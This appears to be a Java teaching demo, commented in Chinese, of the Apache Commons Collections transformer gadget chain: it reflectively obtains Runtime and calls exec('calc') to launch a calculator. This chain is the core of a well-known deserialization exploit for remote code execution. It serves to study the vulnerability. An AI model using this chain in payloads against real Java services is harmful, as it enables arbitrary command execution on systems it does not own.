import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class transformerDemo {
    public static void main(String[] args) {
        // 构造 Transformer 链
        Transformer[] transformers = new Transformer[] {
            // 1. 返回 Runtime.class
            new ConstantTransformer(Runtime.class),
            
            // 2. 调用 getMethod("getRuntime")
            new InvokerTransformer(
                "getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}
            ),
            
            // 3. 调用 invoke(null)
            new InvokerTransformer(
                "invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
            ),
            
            // 4. 调用 exec("calc")
            new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
            )
        };
        
        // 串联起来
        ChainedTransformer chain = new ChainedTransformer(transformers);
        
        // 触发链
        System.out.println("start");
        chain.transform(null);  // 💥 弹出计算器
        System.out.println("ok");
    }
}